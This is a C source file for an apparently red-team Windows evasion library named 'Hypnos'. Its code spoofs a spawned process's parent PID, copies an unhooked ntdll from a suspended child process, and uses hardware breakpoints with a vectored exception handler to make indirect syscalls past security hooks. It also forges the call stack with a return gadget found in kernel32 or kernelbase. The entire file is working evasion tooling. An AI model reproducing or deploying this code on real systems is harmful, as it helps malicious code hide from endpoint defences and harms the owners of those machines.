#include "hypnos.h"

#pragma region GlobalVariables

PVOID exceptionHandlerHandle;
HANDLE hNtdll;
HANDLE hNtdllCopy;
UINT64 ntFunctionAddress;
PCHAR ntFunctionName;
UINT64 retGadgetAddress;

#pragma endregion

#pragma region BinaryPatternMatching
// @janoglezcampos, @idov31 - https://github.com/Idov31/Cronos/blob/master/src/Utils.c
BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask)
{
    DWORD_PTR dwAddress = 0;
    PIMAGE_DOS_HEADER imageBase = (PIMAGE_DOS_HEADER)GetModuleHandleA(moduleName);

    if (!imageBase)
        return 0;

    DWORD_PTR sectionOffset = (DWORD_PTR)imageBase + imageBase->e_lfanew + sizeof(IMAGE_NT_HEADERS);

    if (!sectionOffset)
        return 0;

    PIMAGE_SECTION_HEADER textSection = (PIMAGE_SECTION_HEADER)(sectionOffset);
    dwAddress = FindPattern((DWORD_PTR)imageBase + textSection->VirtualAddress, textSection->SizeOfRawData, bMask, szMask);
    return dwAddress;
}

#pragma endregion

#pragma region PebParsing

UINT64 GetModuleAddress(LPWSTR moduleName) {
    PPEB peb = NtCurrentPeb();
    LIST_ENTRY* ModuleList = NULL;

    if (!moduleName)
        return 0;

    for (LIST_ENTRY* pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
        pListEntry != &peb->Ldr->InMemoryOrderModuleList;
        pListEntry = pListEntry->Flink) {

        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (wcsstr(pEntry->FullDllName.Buffer, moduleName)) {
            return (UINT64)pEntry->DllBase;
        }
    }
    return 0;
}

VOID GetExportDirectory(UINT64 moduleBase, PIMAGE_EXPORT_DIRECTORY* exportDirectory) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + dosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

    *exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
}

UINT64 GetSymbolAddress(UINT64 moduleBase, const char* functionName) {
    UINT64 functionAddress = 0;
    PIMAGE_EXPORT_DIRECTORY exportDirectory;
    GetExportDirectory(moduleBase, &exportDirectory);

    DWORD* addresses = (DWORD*)(moduleBase + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)(moduleBase + exportDirectory->AddressOfNameOrdinals);
    DWORD* names = (DWORD*)(moduleBase + exportDirectory->AddressOfNames);

    for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
        if (_stricmp((char*)(moduleBase + names[j]), functionName) == 0) {
            functionAddress = moduleBase + addresses[ordinals[j]];
            break;
        }
    }

    return functionAddress;
}

#pragma endregion

#pragma region Hypnos

DWORD64 FindSyscallNumber(DWORD64 functionAddress) {
    /*
        Windows syscall calling convention

            mov r10, rcx
            mov eax, syscall_number
            syscall
    */

    return (WORD) * ((PBYTE)functionAddress + 4); // The syscall number is at the 4th position from the function address
}

DWORD FindProcess(WCHAR* name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return -1;

    PROCESSENTRY32 processentry32;
    processentry32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &processentry32)) return -1;

    do {
        if (wcscmp(processentry32.szExeFile, name) == 0) {
            return processentry32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &processentry32));

    return -1;
}

HANDLE SpoofProcessPPID(LPCSTR toSpawn, WCHAR* parentName) {
    DWORD parentPid = FindProcess(parentName);
    STARTUPINFOEXA startUpInfo;
    PROCESS_INFORMATION processInformation;
    SIZE_T attributeSize;
    SecureZeroMemory(&startUpInfo, sizeof(startUpInfo));
    SecureZeroMemory(&processInformation, sizeof(processInformation));

    HANDLE parentHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, parentPid);

    // Setting up attributes to spoof PPID
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    startUpInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(startUpInfo.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(startUpInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), NULL, NULL);
    startUpInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Now, we can create the child process
    BOOL res = CreateProcessA(NULL, (LPSTR)toSpawn, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, &startUpInfo.StartupInfo, &processInformation);

    if (res) {
        DBG_PRINT("[+] Spoofed PPID of %s to %lu\n", toSpawn, parentPid);
    }

    return processInformation.hProcess;
}

PVOID GetNtdllCopy() {
    // Gets a HANDLE to NTDLL via suspended process method
    HANDLE childHandle = SpoofProcessPPID("calc.exe", L"explorer.exe");
    if (childHandle == INVALID_HANDLE_VALUE) {
        DBG_PRINT("[!] Could not create child process\n");
        return NULL;
    }

    // Parsing headers from NTDLL
    PIMAGE_DOS_HEADER ntdllDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS  ntdllNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllDosHeader + (BYTE)ntdllDosHeader->e_lfanew);
    DWORD ntdllSize = ntdllNtHeaders->OptionalHeader.SizeOfImage;

    LPVOID ntdllCopy = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ntdllSize);
    if (!ReadProcessMemory(childHandle, hNtdll, ntdllCopy, ntdllSize, NULL)) {
        DBG_PRINT("[!] Could not read process memory to ntdllCopy, %d\n", GetLastError());
        return NULL;
    }

    TerminateProcess(childHandle, 0);
    return ntdllCopy;
}

DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber) {
    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/#!res/2021/halosgate.md
    DWORD64 syscallReturnAddress = 0;

    for (WORD idx = 1; idx <= 32; idx++) {
        if (*((PBYTE)functionAddress + idx) == 0x0f && *((PBYTE)functionAddress + idx + 1) == 0x05) {
            syscallReturnAddress = (DWORD64)((PBYTE)functionAddress + idx);
            DBG_PRINT("[+] Found \"syscall;ret;\" opcode address: 0x%I64X\n", syscallReturnAddress);
            break;
        }
    }

    if (syscallReturnAddress == 0)
        DBG_PRINT("[-] Could not find \"syscall;ret;\" opcode address\n");

    return syscallReturnAddress;
}

#pragma endregion

UINT64 PrepareSyscall(PCHAR functionName) {
    return ntFunctionAddress;
}

BOOL SetMainBreakpoint() {
    // Getting a handle to the current thread
    HANDLE currentThread = GetCurrentThread();

    // Resolving GetThreadContext and SetThreadContext at runtime
    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L"KERNEL32.DLL"), "GetThreadContext");
    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L"KERNEL32.DLL"), "SetThreadContext");

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Get current thread context
    pGetThreadContext(currentThread, &ctx);

    // Set hardware breakpoint on PrepareSyscall function
    ctx.Dr0 = (UINT64)&PrepareSyscall;
    ctx.Dr7 |= (1 << 0);
    ctx.Dr7 &= ~(1 << 16);
    ctx.Dr7 &= ~(1 << 17);
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Apply the modified context to the current thread
    if (!pSetThreadContext(currentThread, &ctx)) {
        DBG_PRINT("[-] Could not set new thread context: 0x%X", GetLastError());
        return FALSE;
    }

    DBG_PRINT("[+] HWBP on PrepareSyscall set successfully\n");
    return TRUE;
}

BOOL IsHooked(DWORD64 functionAddress) {
    char syscallStub[] = { 0x4C, 0x8B, 0xD1, 0xB8 };
    return !FindPattern(functionAddress, 4, (PBYTE)syscallStub, (PCHAR)"xxxx");
}

LONG ExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&PrepareSyscall) {
            DBG_PRINT("\n===============HYPNOS DEBUG===============");
            DBG_PRINT("\n[+] PrepareSyscall hit (%p)\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);

            // Find the address of the syscall function in ntdll we got as the first argument of the PrepareSyscall function-
            ntFunctionName = (PCHAR)(ExceptionInfo->ContextRecord->Rcx);
            ntFunctionAddress = GetSymbolAddress((UINT64)hNtdll, ntFunctionName);
            DBG_PRINT("[+] Found %s address: 0x%I64X\n", ntFunctionName, ntFunctionAddress);

            // Move breakpoint to the NTAPI function;
            DBG_PRINT("[+] Moving breakpoint to %#llx\n", ntFunctionAddress);
            ExceptionInfo->ContextRecord->Dr0 = ntFunctionAddress;
        }
        else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)ntFunctionAddress) {
            DBG_PRINT("[+] NTAPI Function Breakpoint Hit (%#llx)!\n", (DWORD64)ExceptionInfo->ExceptionRecord->ExceptionAddress);

            // Create a new stack to spoof the kernel32 function address
            // The stack size will be 0x70 which is compatible with the RET_GADGET we found.
            // sub rsp, 70
            ExceptionInfo->ContextRecord->Rsp -= 0x70;
            // mov rsp, RET_GADGET_ADDRESS
            *(PULONG64)(ExceptionInfo->ContextRecord->Rsp) = retGadgetAddress;
            DBG_PRINT("[+] Created a new stack frame with RET_GADGET (%#llx) as the return address\n", retGadgetAddress);

            // Copy the stack arguments from the original stack
            for (size_t idx = 0; idx < STACK_ARGS_LENGTH; idx++)
            {
                const size_t offset = idx * STACK_ARGS_LENGTH + STACK_ARGS_RSP_OFFSET;
                *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) = *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset + 0x70);
            }
            DBG_PRINT("[+] Original stack arguments successfully copied over to the new stack\n");

            DWORD64 pFunctionAddress = ExceptionInfo->ContextRecord->Rip;
            if (IsHooked(pFunctionAddress)) {
                DBG_PRINT("[+] Function is hooked!\n");

                WORD syscallNumber = FindSyscallNumber(GetSymbolAddress((UINT64)hNtdllCopy, ntFunctionName));
                DBG_PRINT("[+] Found syscall number: 0x%x\n", syscallNumber);
                DWORD64 syscallReturnAddress = FindSyscallReturnAddress(pFunctionAddress, syscallNumber);

                if (syscallReturnAddress == 0) {
                    DBG_PRINT("[!] Could not find syscall return address!\n");
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
  
                // mov r10, rcx
                // mov eax, SSN
                // Set RIP to syscall;ret; opcode address
                ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
                ExceptionInfo->ContextRecord->Rax = syscallNumber;
                DBG_PRINT("[+] Jumping to \"syscall;ret;\" opcode address: 0x%I64X\n", syscallReturnAddress);
                ExceptionInfo->ContextRecord->Rip = syscallReturnAddress;
            }

            // Move breakpoint back to PrepareSyscall to catch the next invoke
            DBG_PRINT("[+] Moving breakpoint back to PrepareSyscall to catch the next invoke\n");
            ExceptionInfo->ContextRecord->Dr0 = (UINT64)&PrepareSyscall;

            DBG_PRINT("==============================================\n\n");

        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL FindRetGadget() {
    // Dynamically search for a suitable "ADD RSP,68;RET" gadget in both kernel32 and kernelbase
    retGadgetAddress = FindInModule("KERNEL32.DLL", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
    if (retGadgetAddress != 0) {
        DBG_PRINT("[+] Found RET_GADGET in kernel32.dll: %#llx\n", retGadgetAddress);
        return TRUE;
    }

    retGadgetAddress = FindInModule("kernelbase.dll", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
    if (retGadgetAddress != 0) {
        DBG_PRINT("[+] Found RET_GADGET in kernelbase.dll: %#llx\n", retGadgetAddress);
        return TRUE;
    }

    DBG_PRINT("[!] Could not find a gadget in kernel32 and kernelbase");
    return FALSE;
}

BOOL InitHypnos() {
    hNtdll = (HANDLE)GetModuleAddress(L"ntdll.dll");
    hNtdllCopy = (HANDLE)GetNtdllCopy();

    if (!FindRetGadget()) {
        DBG_PRINT("[!] Could not find a suitable \"ADD RSP,68;RET\" gadget in kernel32 or kernelbase.");
        return FALSE;
    }

    // Register exception handler
    exceptionHandlerHandle = AddVectoredExceptionHandler(1, &ExceptionHandler);

    if (!exceptionHandlerHandle) {
        DBG_PRINT("[!] Could not register VEH: 0x%X\n", GetLastError());
        return FALSE;
    }

    return SetMainBreakpoint();
}

BOOL DeinitHypnos() {
    CloseHandle(hNtdllCopy);
    CloseHandle(hNtdll);

    return RemoveVectoredExceptionHandler(exceptionHandlerHandle) != 0;
}
